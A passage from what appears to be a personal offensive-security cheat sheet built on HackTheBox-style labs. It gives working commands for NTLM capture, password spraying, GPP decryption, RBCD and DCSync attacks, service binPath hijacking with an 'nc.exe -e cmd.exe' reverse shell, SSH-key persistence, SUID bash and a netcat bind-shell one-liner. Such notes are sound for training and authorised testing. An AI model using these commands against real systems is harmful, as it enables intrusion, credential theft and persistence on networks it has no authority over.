Use **responder** to listening, if you use impacket-sambaserver it is possible that doesn't give you the hash.
```
responder -I tun0 -v
```

If any person open the folder where is the file, only with open the folder you obtain the hash NTLM

There are a tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) that generate and test different files to see what is valid.

---

## Abusing GPP Passwords

If you are in a domain controlled and you're allowed to see the content of the SYSVOL resource or a similar structure you can found credentials inside. The path normally is this:

```bash
smbmap -H 10.10.10.10 -r Policies/{31B...-5661...-725}/MACHINE/Preferences/Groups/Groups.xml
```

To crack the hash you can use `gpp-decrypt` tool (Microsoft shared the AES-key).

```bash
gpp-decrypt <cpassword_value>
```

---

## Password Spraying

The attack involves attempting to log in using one common password and a longer list of usernames or email addresses.

Example of how it works:

| Round | User | Password | Note |
| :--- | :--- | :--- | :--- |
| 1 | `bob.smith@inlanefreight.local` | `Welcome1` | |
| 1 | `john.doe@inlanefreight.local` | `Welcome1` | |
| 1 | `jane.doe@inlanefreight.local` | `Welcome1` | |
| - | - | - | **DELAY** |
| 2 | `bob.smith@inlanefreight.local` | `Passw0rd` | |
| 2 | `john.doe@inlanefreight.local` | `Passw0rd` | |

It's recommended to know the password policy. If you don't know it, wait a few hours between attempts — long enough for the account lockout threshold to reset.

**Considerations:**
- Know the password policy BEFORE spraying to avoid locking accounts
- If you don't know it, wait several hours between attempts
- `badPwdCount` in crackmapexec shows the failed attempt counter

**Password policy enumeration:**
```bash
crackmapexec smb <IP> -u user -p pass --pass-pol
rpcclient -U "" -N <IP> → querydominfo → getdompwinfo
enum4linux -P <IP>
net accounts    # from Windows
```

### From a Linux Host

rpcclient is an excelent option for perform this attack from Linux. One consideration is that a valid login is not immediately, with the response `Authority Name` indicate a successful login.

Bash one-liner adapted
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Using kerbrute for the attack:
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Using CrackMapExec

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

After getting one (or more!) hits, you can use crackmapexec to validate the credentials quickly against a Domain Controller.

```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

#### Password spraying for LDAP service

```bash
netexec ldap <IP> -u user.list -p 'password' --continue-on-success
```

### Internal Password Spraying - from Windows

If you're in a domain-joined windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective.

If we're authenticated in the domain, the tool will generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write the output to a file.

Load the script:

```powershell
Import-Module .\DomainPasswordSpray.ps1
or
. .\DomainPasswordSpray.ps1
```

```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### External Password Spraying

You can do this method with different services. Some common targets are:

- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication

---

## Windows Privilege Escalation

> [!NOTE]
> If you don't found nothing you can always use BloodHound or upload linpeas/winpeas binary

### Obtain basic information

```
net user support
```

```
net group
```

```
net localgroups
```

Show security privileged assigned:
```powershell
whoami /priv
```

If you don't know if you can escalate with the permission, you can check hacktricks or search in google. Some dangerous permission:
- `SeImpersonatePrivilege`.

Check groups of the user
```
whoami /groups
```

Check logon requirements. Useful for bruteforce.
```
net accounts
```

### Scheduled Tasks

There are two main approach to take advantages of scheduled tasks:
1. Add new scheduled task jobs
2. Trick them to execute a malicious software

Check if autologin is enable for some user, you can see the user in field DefaultUserName and password in field DefaultPassword with:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Search exposed credentials

This is very common in configuration files, log files and user history files (PSReadLine)

### Password reuse

It's possible that one password found it's used in another user, program, service...

### Abusing privileges or popular groups

There are different privileges that we can abuse

#### SeImpersonatePrivilege

#### SeLoadDriverPrivilege
This privileges is gived automatically to users which belong to `printer operators`.

I try this all this in a machine and I couldn't get it to work

https://www.tarlogic.com/blog/explotacion-seloaddriverprivilege/

If the service is disabled you can enable with AdjustTokenPrivilege.

You can compile with `g++` binary, if the victim machine doesn't have installed, you download in your attacker machine and upload.

Or if you prefer download the binaries compiled you can do from here:
https://github.com/JoshMorrison99/SeLoadDriverPrivilege

You can use the eoploaddriver from tarlogic to obtain system access
https://github.com/TarlogicSecurity/EoPLoadDriver


Compiled for x64:
https://github.com/IceL0rd4Real/EoPLoadDriver

Download the .sys file:
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys 

#### Server Operator groups
Server operators
We can manipulate the path of some binaries that are executed as a service.

If you're connected with evil-winrm you can use the following script to see the services:
```powershell
services
```

The services that return a "True" means that you're able to change the path of the binary that execute the service.

To choose the best services you can check:
- [ ] Have **privilege = true** to modify the path
- [ ] If you stop the service don't break or stop the machine
- [ ] A service that probably is running from system/administrator.
- [ ] Some services can have extra protections that block you to change the binary.
	- [ ] WifDefen (Defender)
	- [ ] WdNisSvc (Defender)
	- [ ] ADWS (Active Directory)

To check if the services is running as a system you can use:
```powershell
sc.exe qc <service_name>
```

LocalSystem = System

Change the path:
```powershell
sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234 -e powershell.exe"
```

Start listening in your attacker machine

```
rlwrap nc -nlvp 1234
```

Then stop the service

```
sc.exe stop VMTools
```

And start:
```
sc.exe start VMTools
```

You will receive the session.
If you receive the session, but when you use an enter for example give you an error, you can use another process.

Alternatives

You can add your use to administrator:
```
sc.exe config VMTools binPath="cmd.exe /c net localgroup administrators svc-printer /add"
```


Another alternative you can upload a revshell.exe and change the path to the new binary
```
sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
```



### Kiosk Mode
https://github.com/ikarus23/kiosk-mode-breakout

### Docker Escape

Docker escape or docker breackout

- [ ] Check if you are in a docker with `ls -la /` and if you see **.dockerenv** file
- [ ] See environment variables with: `env` command.
- [ ] Try to find docker.socket
	- [ ] find / -name docker.sock 2>/dev/null
	- [ ] /var/run/docker.sock

### Vulnerable software

In Windows you can look in `C:\Program Files` to find software.

You have more ways here:
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#user-enumeration

### Kernel exploits

### Abusing `SeImpersonate` privileges

Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.

### Enumeration scripts

- Seatbelt
- JAWS
- WinPeas
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

### RBCD Attack

Resource-Based Constrained Delegation.

Is a method to give granular permission to users and services.

In this case it is possible that user or nestead groups have "GenericAll" and can do what they want with objects.

You have a python script that do all automatically:
- https://github.com/tothi/rbcd-attack

If you search in [hacktricks](https://hacktricks.wiki/es/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html?highlight=rbcd#limpieza--restablecimiento-de-rbcd) how to exploit it.

#### Create a computer object

You can use [pwermad](https://github.com/Kevin-Robertson/Powermad)

```powershell
import-module .\Powermad.ps1
```

```powershell
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

You can change the machineAccount and the password (SecureString), but you will need to remember later.

Check if it is created (before check you need to Import-Module PowerView)
```powershell
Get-DomainComputer SERVICEA
```

#### Configurating Resource-Based Constrained Delegation

**Built-in module Powershell activedirectory**

`$targetComputer` is the hostname of the machine, example, dc.

Assign delegation privileges:
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$
```

Check that it worked:
```powershell
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
```

**PowerView**

Download PowerView.ps1:
```powershell
Import-Module .\PowerView.ps1
```

Obtained the SID:
```powershell
$ComputerSid = Get-DomainComputer <COMPUTER_NAME> -Properties objectsid | Select -Expand objectsid
```

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
```

```powershell
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```powershell
$SD.GetBinaryForm($SDBytes, 0)
```

Important to indicate the hostname of the machine:
```powershell
Get-DomainComputer <HOSTNAME> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Check that it worked:
```powershell
Get-DomainComputer <HOSTNAME> -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

You have to see something like:

```powershell
msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

#### Obtaining TGT ticket with impacket-getST.py

All this in your attacker machine

In hacktricks show that you can use rubeus, in place, we are going to obtain from the tool that could have automated all.
https://github.com/tothi/rbcd-attack

And we are going to the impacket-getST.py to create a Ticket Granting Ticket and saved as Administrator.ccache file
```bash
getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip <IP> support.htb/<HOSTNAME_CREATED_BEFORE>$:<PASSWORD_FOR_THE_COMPUTER_123456>
```

```bash
getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip <IP> support.htb/SERVICEA$:123456
```

Create this environment variable:
```bash
export KRB5CCNAME=Administrator.ccache
```

#### Connect to the host

```bash
impacket-psexec -k dc.support.htb
```

### Check if some user is kerberoastable and as-rep roastable

You can check with bloodhound in analysis tab. Or with the tools.

### Abuse Account Operator group + WriteDACL in another group

If you have a user that is part from Account Operator means that you can create non administrator user, groups and assign groups to the users created.

If in another group you see WriteDACL permission, that means that you can abuse to use DcSync Attack.

With both, you can create a user and assigned to that group that have WriteDACL permission to do a DcSync attack and escalate privilege.

Create the user:
```
net user sergiky sergik123 /add /domain
```

Add the user as a member of the group:
```
net group "Exchange Windows Permission" sergiky /add
```

Also, if it is possible, to connect directly we can do member of remote management user or other group like this:
```
net localgroup "Remote Management Users" sergiky /add
```

Upload PowerView and import them, `Import-Module .\PowerView.ps1`.

Create the password. PSCredential force to create a password as SecureString.
```
$SecPassword = ConvertTo-SecureString 'password_of_user_created(sergiky)' -AsPlainText -Force
```

Build a credential object indicating a user and a password. When you use `-Credential $Cred` in another command, the command will be executed **for that user in the variable**, not for the user that is executing the command.
```
$Cred = New-Object System.Management.Automation.PSCredential('domain.local\user', $SecPassword)
```

Create an Access Control Entry (ACE) for the ACL of the object of the domain
```
Add-ObjectAcl -PrincipalIdentity sergiky -Credential $cred -Rights DCSync
```

- `Rights DCSync`: Active `DS-Replication-Get-Changes` and `-Get-Changes-All` to allow the dcsync for that user

> [!WARNING]
> In BloodHound doesn't indicate `-PrincipalIdentity <user>`, if you don't write this it is possible that doesn't work.

I recommend you to check If the ACE was added.

```
dsacls "DC=testlab,DC=local" | Select-String "Replicating"
```

#### Do the DcSync

With mimikatz:
```
lsadump::dcsync /domain:testlab.local /user:Administrator
```

Or with secretdump:
```
/secretsdump.py htb.local/john@10.10.10.161
```

If you want to cleanup

```
Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

Or if you want to do all automatic from linux:
```
./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00pyAdministrator:Password123
```

- https://github.com/n00py/DCSync

---

## Change user with runascs.exe

You have the original binary that is runas.exe but this solve no full tty problems (for example when use rlwrap). With this binary you are able to change or obtain a session of a user (with valid credentials).

```
.\runascs.exe user1 password powershell.exe -r <attacker_ip> <port>
```

You need to be listening in your attacker computer to send the shell (rlwrap nc ...).

---

## Search internal open ports

You can use:

```powershell
netstat -an | findStr /i "TCP"
```

---

## Linux Privilege Escalation

### Checklist

1. **Sudo:** `sudo -l` → look at [GTFOBins](https://gtfobins.org/)
2. **SUID binaries:** `find / -perm -4000 -type f 2>/dev/null` → check GTFOBins
3. **Capabilities:** `getcap -r / 2>/dev/null`
4. **Cron jobs:** check `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root` — editable files
5. **SSH keys:** look for `id_rsa` in `/home/*/.ssh/` and `/root/.ssh/` — if readable, you can authenticate
6. **Exposed credentials:** config files, logs, `.bash_history`
7. **Vulnerable software:** `dpkg -l` → look for CVEs
8. **Kernel exploits:** search CVE by kernel version (`uname -r`) — e.g.: DirtyCow CVE-2016-5195
9. **Password reuse**
10. **NFS no_root_squash:** mount share and create SUID binary
11. **Automated tools:** LinPeas, LinEnum, linuxprivchecker

### Add SUID privilege to the bash

You can add SUID privilege to the bash if root can execute commands:

Root:
```bash
chmod u+s /bin/bash
```

Non privileged user.
```bash
bash -p
```

### Add Public Key (persistence)

```bash
ssh-keygen -f key
echo "ssh-rsa AAAA...= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

---

## Pivoting - Strategy

### When to Use Each Tool

| Scenario | Recommended Tool |
|----------|-----------------|
| Fast, clean pivot | **Ligolo-ng** (recommended for OSCP) |
| Only SSH available | `ssh -D 9050` + proxychains |
| SSH available, full network | **sshuttle** (more transparent than proxychains) |
| Only HTTP/HTTPS outbound | **Chisel** (reverse tunnel) |
| Windows, native tools | **Netsh** (port forwarding) or **plink.exe** |
| Firewall blocks ICMP | **Ptunnel-ng** (encapsulates in ICMP) |
| Firewall blocks everything except DNS | **DNScat2** |
| Double or triple pivot | Ligolo-ng + routes or metasploit autoroute |

### General Pivoting Flow

1. Check interfaces on compromised host: `ip route` (Linux) / `netstat -r` (Windows)
2. Identify internal subnets the pivot has access to
3. Ping sweep to discover hosts: `for i in {1..254}; do ping -c1 172.16.5.$i & done | grep from`
4. Choose pivoting method based on available tools
5. Configure proxychains or routes according to method
6. Scan internal hosts: `proxychains nmap -Pn -sT 172.16.5.19`

> Ping sweep may fail on first attempt due to ARP cache — try at least twice.

---

## Active Directory Enumeration

### Initial Enumeration Flow

1. Null session SMB/RPC → users, groups, password policy
2. LDAP anonymous bind → same info
3. Kerberos brute force (kerbrute) → valid users without generating logs
4. With credentials → BloodHound to understand relationships

### With BloodHound

1. Run SharpHound on Windows: `Invoke-BloodHound -CollectionMethod All`
2. Download the ZIP: `download "C:/Windows/Temp/test/*.zip" bloodhound.zip`
3. Start neo4j: `sudo systemctl start neo4j`
4. Start BloodHound: `bloodhound &>/dev/null & disown`
5. Upload the ZIP → Analysis → look for paths to Domain Admin

### Identify Vulnerabilities from SYSTEM

With `NT AUTHORITY\SYSTEM` on a domain machine, the computer can be impersonated to get DC information:

- Perform Kerberoasting / AS-REP Roasting
- Run Inveigh to capture Net-NTLMv2 hashes
- Impersonate privileged user tokens
- Perform ACL attacks

---

## Enumerating Password Policy

If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy

### Enumerating password policy from Linux

With null session of SMB you can onbtain a listing of users, groups, computers, user account attributes and the domain password policy.

With valid credentials:
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Without credentials we may be able to obtain password policy via SMB NULL or LDAP Anonymous.

We can connect through rpcclient and use querydominfo to see information of the domain.

```bash
rpcclient -U "" -N 172.16.5.5
querydominfo
```

To see the password policy you can use
```bash
getdompwinfo
```

You can use **enum4linux**
```
enum4linux -P 172.16.5.5
```

```
[+] Password Info for Domain: INLANEFREIGHT

...
```

The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of enum4linux in Python, but has additional features such as export data as YAML or JSON. It also supports colored output.

```
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

### Enum null session from Windows

It is less common to do this type of attack from Windows, but you can use the following command to establish a null session.

```
net use \\DC01\ipc$ "" /u:""
```

Some common error:
```
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.
```

```
net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```

```
net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.
```

### Enumerating password policy from Linux - LDAP Anonymous Bind

Allow unauthenticated attackers to retrieve information from the domain, such as a list of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration,

We can use tool like `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.

#### ldapsearch

With ldapsearch it can be a bit cumbersome but doable.

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enumerate the password policy from windows

```
net accounts
```

`We do not want to be the pentester that locks out every account in the organization!`

### PowerView

This tool help us gain situational awareness within AD environment.

```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```

---

## Enumerating Domain Users

If you have SYSTEM in a machine you can easily query Active directory for users and password policy. If you don't obtain users, you can use external resources such as email harvesting and Linkedin

### SMB Null session to pull user list

Obtaining only the usernames
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```
rpcclient -U "" -N 172.16.5.5
```

```
crackmapexec smb 172.16.5.5 --users
```

### Gathering users with LDAP Anonymous

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Search domain admins

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

- `--da`: enumerate domain admins group memebers

### Search privileged users

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

- `-PU`: Recursive search for users with nested group membership.

### Enumerate users with kerbrute

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

### With authenticated credentials

You can ask directly to the AD

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

---

## Web Enumeration

### First Look

1. Open Burp Suite before visiting the site
2. Check `robots.txt` and `sitemap.xml`
3. Open Developer Console
4. View source code
5. Identify technologies with Wappalyzer or WhatWeb

### Important Files/Paths to Check

- `robots.txt`
- `sitemap.xml`
- `/.well-known/security.txt`
- `/.well-known/change-password`
- `/.well-known/openid-configuration`
- `/.well-known/assetlinks.json`

### Active Enumeration

```bash
# Banner/technology
curl -IL https://www.inlanefreight.com
whatweb --no-errors 10.10.10.0/24

# Directories
gobuster dir -u https://<IP>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# Subdomains/vhosts
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb"
```

### Web Crawling

```bash
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```

EyeWitness for screenshots: https://github.com/RedSiege/EyeWitness

---

## Squid Proxy

If you find a Squid proxy (port 3128):

1. Add to proxychains:
```
http 10.10.10.224 3128
```

2. Scan with nmap through the proxy:
```bash
proxychains -q nmap -sT -Pn -v -n 127.0.0.1 -oN allPortsSquidProxy
```

3. If you find another port 3128 on an internal host (internal proxy):
```
http 127.0.0.1 3128
```

4. If the scan is slow, use a custom bash script:
```bash
#!/usr/bin/env bash
for port in $(seq 1 65525); do
    proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.77/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

5. Internal host scan on specific ranges:
```bash
#!/usr/bin/env bash
for port in 21 22 25 53 80 88 443 445 8080 8081; do
    for i in $(seq 1 254); do
        proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>/dev/null && echo "[+] Port $port - OPEN on host 10.241.251.$i" &
    done
done; wait
```

---

## Virtual Hosting

When a server manages multiple domains via the `Host` header. If you find an IP, there may be other sites on the same server.

1. Add the known hostname to `/etc/hosts`
2. Fuzz vhosts with gobuster or ffuf
3. If you find a new vhost, add it to `/etc/hosts` too

If the service is on a non-standard port:
```bash
gobuster vhost -u http://inlanefreight.htb:1234 -w ...
```

---

## Common Scenarios

### Scenario 1: No Credentials — Discover and Move
Standard checks (SMB null, LDAP anonymous) yield nothing → Kerbrute with jsmith.txt combined with LinkedIn → password spray with "Welcome1" → hits on two low-privilege users → BloodHound → find path to Domain Admin.

### Scenario 2: Non-Standard Username Format
LinkedIn and GitHub return nothing. Search for PDFs published by the company → metadata reveals GUID format `F9L8` (4 chars, A-Z0-9). Generate wordlist:
```bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```
Kerbrute finds valid accounts → continue with RBCD or Shadow Credentials attack.

---

## Pentest Guidelines

### Suggested Order of Operations

1. **External passive reconnaissance** — OSINT, DNS, subdomains, WHOIS, breaches
2. **Active reconnaissance** — ping sweep, nmap, banner grabbing
3. **User enumeration** — LDAP, RPC, Kerberos, SMB null sessions, scraping
4. **Password policy enumeration** — before any spraying
5. **Security controls** — Defender, AppLocker, LAPS (if credentials available)
6. **Password spraying** — with known policy to avoid account lockouts
7. **With credentials** → BloodHound, Kerberoasting, ACL attacks
8. **Privilege escalation** — local → domain admin → forest

### Key Notes

- CMD does not save command history, PowerShell does (PSReadLine)
- Execution Policy and UAC affect PowerShell but not CMD
- A local SYSTEM can impersonate the computer object and communicate with AD
- If you find the domain name: add it to `/etc/hosts`
- When password spraying: `--local-auth` in CME to avoid lockouts
- Always sync clock with DC before Kerberos attacks: `sudo ntpdate <DC_IP>`

### Useful Resources

- [GTFOBins](https://gtfobins.org/) — Linux SUID/sudo/capabilities
- [LOLBAS](https://lolbas-project.github.io/#) — Windows living-off-the-land
- [WADComs](https://wadcoms.github.io/) — interactive cheatsheet for AD/Windows offensive tools
- [HackTricks LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)
- [Oracle SQL Commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm)
- [John Hash Formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)
- [Harmj0y PowerShell cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

### Default Passwords to Try

- `admin:admin`
- `root:root`
- `user:password`

### Protocol Command Tables

**POP3:**
| Command | Description |
|---------|-------------|
| `USER username` | Identify user |
| `PASS password` | Authenticate |
| `STAT` | Number of stored emails |
| `LIST` | Number and size of all emails |
| `RETR id` | Get email by ID |
| `DELE id` | Delete email by ID |
| `QUIT` | Close connection |

**IMAP:**
| Command | Description |
|---------|-------------|
| `1 LOGIN username password` | Login |
| `1 LIST "" *` | List directories |
| `1 SELECT INBOX_NAME` | Select mailbox |
| `1 FETCH <ID> all` | Get message metadata |
| `1 FETCH <ID> BODY[]` | Get email body |
| `1 LOGOUT` | Close connection |

**FTP:**
- `cd` / `ls` / `ls -la` / `ls -R` / `get file` / `prompt; mget *` / `put file` / `status` / `exit`

**R-services (ports 512, 513, 514):**
```bash
rlogin 10.0.17.2 -l htb-student
rwho
rusers -al 10.0.17.5
```

---

## NFS — Privilege Escalation

If `root_squash` is not configured, it's possible to create a SUID binary on the mounted share:

1. Mount NFS share: `sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock`
2. List UIDs/GIDs: `ls -n ./target-NFS/`
3. If there's a user UID without `root_squash`, create shell with that UID and setuid bit
4. Execute the shell via SSH as that user to get privileges

---

## SMTP — Enumeration Methodology

1. Banner grabbing: `nc -nv <IP> 25` or `telnet <IP> 25`
2. Enumerate users: `smtp-user-enum -M VRFY -U users.txt -t <IP>`
3. Detect open relay: `nmap -p25 --script smtp-open-relay -v <IP>`
4. If open relay — possible internal phishing email sending

---

## IPMI — Attack Procedure

1. Detect IPMI: `nmap -sU --script ipmi-version -p 623 <IP>`
2. Dump hashes with Metasploit: `use auxiliary/scanner/ipmi/ipmi_dumphashes`
3. Crack hash: `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`
4. Access BMC web console with obtained credentials

---

## SSH with Kerberos

### Login in ssh with kerberos

If you test to fail three times the password of ssh you see something like this:

`Permission denied (gssapi-keyex,gssapi-with-mic,password)`

This means that you need to use kerberos auth method to use ssh.

You need to have installed **krb5 package**, this package have a configuration file in **/etc/krb5.conf**, if you don't see, you can create with `dpkg-reconfigure krb5-config`

An example to create a valid configuration is this:
```
[libdefaults]
	default_realm = REALCORP.HTB

[realms]
# use "kdc = ..." if realm admins haven't put SRV records into DNS
	REALCORP.HTB = {
		kdc = srv01.realcorp.htb
	}

[domain_realm]
	.REALCORP.HTB = REALCORP.HTB
	REALCORP.HTB = REALCORP.HTB
```

Then you follow the next command with **sudo**:
```bash
sudo klist # Check if exist something
sudo kdestroy # to delete the ticket
sudo kinit <username> # Create a ticket with the username, you need the password
sudo klist # to check if the new ticket was created
```

Now to use ssh you have to add the option and you don't need to introduce any password:
```bash
sudo ssh -o GSSAPIAuthentication=yes j.nakazawa@10.10.10.224
```

Example of use in Tentacle machine, [s4vitar writeup](https://www.youtube.com/watch?v=hFIWuWVIDek)

---

## Security Controls Enumeration

### Windows Defender

By default, will block tools such as `PowerView`.

We can use `Get-MpComputerStatus` to see if `RealTimeProtectionEnabled` parameter is set to True, which means that Defender is enabled

```
Get-MpComputerStatus

....
RealTimeProtectionEnabled       : True
```

### AppLocker

An application whitelist is a list of approved software or executable allowed to be installed or run in a system.

It is common to organisation to block `PowerShell.exe` and `cmd.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.

Sometimes, we run into more stringent `AppLocker` policies that require more creativity to bypass.

Using `Get-AppLockerPolicy` to see the blocked Apps.
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### PowerShell Constrained Language Mode

PowerShell Constrained Language Mode locks down many features needed to use PowerShell effectively, such as COM objects, only allow approved .NET types, XAML-based workflows, PowerShell classes, and more.

We can rapid enumerate if we are in a Full Language Mode or Constrained Language Mode.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

### LAPS

This solutions is used to randomize and rotate the local administrador passwords. We can enumerate what domain users can read the LAPS password with LAPS installed and what machines do not have LAPS installed.

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) can check the permission of the object "Extended Rights / Security Descriptors" without be administrator.

This will show groups specifically  delegated to read LAPS passwords, normally are protected groups.

```
Find-LAPSDelegatedGroups
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enable for any groups with read access and users with "All Extended RIghts" can read LAPS passwords and may be less protected than users in delegated groups.
```
Find-AdmPwdExtendedRights
```

We can use `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if your user have access.

```powershell
Get-LAPSComputers
```

---

## Credentialed Enumeration

### From Winux

To dig deeper we need to have low privilege domain user credentials.

#### Crackmapexec

You can use this tool with MSSQL, SMB, SSH and WinRM credentials.

CME offer a help menu for each protocol.
```
crackmapexec smb -h
```

Some flag that we're going to use:

- -u Username `The user whose credentials we will use to authenticate`
- -p Password `User's password`
- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
- --users `Specifies to enumerate Domain Users`
- --groups `Specifies to enumerate domain groups`
- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`

We will start enumerating users and group asking to the Domain Controller.

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

The result include attributes as `badPwdCount` who help us when perform actions like targeted password spraying. This attribute tracks the number of consecutive failed login attempts.

To obtain a list of domain groups we can use:
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

We can see users that are currently logged:
```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Enumerate shares resources:
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

We see that we can read in some files, so we can use the extension `spider_plus` to dig through each redeable share.

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Now we can see the metadata information at `/tmp/cme_spider_plus/<ip of host>`. We can see interesting files which can contain passwords, PII or configuration files.

#### SMBMap

Check access:
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Do recursive listing of a resource:

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## Shells and Payloads — Strategy

**Bind Shell** (victim listens, you connect):
```bash
# Linux victim:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# Windows victim (PowerShell):
